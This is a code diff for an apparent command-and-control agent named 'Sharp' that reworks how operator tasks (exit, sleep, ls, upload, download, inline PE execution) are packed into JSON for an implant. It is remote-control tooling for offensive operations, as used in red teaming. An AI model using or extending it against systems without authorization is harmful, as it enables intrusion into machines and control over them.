@@ -40,9 +40,11 @@ class CommandExit(Command):
 
     def job_generate( self, arguments: dict ) -> bytes:
 
-        Task = Packer()
-        Task.add_data("goodbye")
-        return Task.buffer #Queue "goodbye" as a tasking. Easy!
+        packer = Packer()
+        data = {"TaskCommand":"exit", "TaskFile":"", "TaskArguments":""}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 
 class CommandSleep(Command):
     Name        = "sleep"
@@ -62,13 +64,11 @@ class CommandSleep(Command):
         print("[*] job generate")
         packer = Packer()
 
-        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
-        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+        data = {"TaskCommand":"sleep", "TaskFile":"", "TaskArguments":arguments["sleeptime"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
 
-        #commands = "/C " + arguments["commands"]
-        #packer.add_data(commands)
-        packer.add_data("sleep "+arguments["sleeptime"])
-        return packer.buffer
 class CommandLs(Command):
     Name        = "ls"
     Description = "List directories"
@@ -87,8 +87,11 @@ class CommandLs(Command):
         print("[*] job generate")
         packer = Packer()
 
-        packer.add_data("ls "+arguments["path"])
-        return packer.buffer
+        data = {"TaskCommand":"ls", "TaskFile":"", "TaskArguments":arguments["path"].rstrip()}
+        json_string = json.dumps(data, indent=4)
+        packer.add_data(json_string)
+        return packer.buffer[:-1]
+
 class CommandUpload(Command):
     Name        = "upload"
     Description = "Upload a file. Need to specify full path to destination."
@@ -111,6 +114,7 @@ class CommandUpload(Command):
     def job_generate(self, arguments: dict) -> bytes:
         print("[*] job generate")
         packer = Packer()
+        
         packer.add_data("upload remote_dest="+arguments["remote_path"]+";"+arguments["local_file"])
         return packer.buffer
 class CommandDownload(Command):
@@ -210,8 +214,7 @@ class CommandInlinePE(Command):
         json_string = json.dumps(data, indent=4)
         packer.add_data(json_string)
         return packer.buffer[:-1]
-        #packer.add_data("inline_pe file="+ arguments["local_exe"]+";"+arguments["args"])
-        #return packer.buffer
+
 class Sharp(AgentType):
     Name = "Sharp"
     Author = "@smallbraintranman"
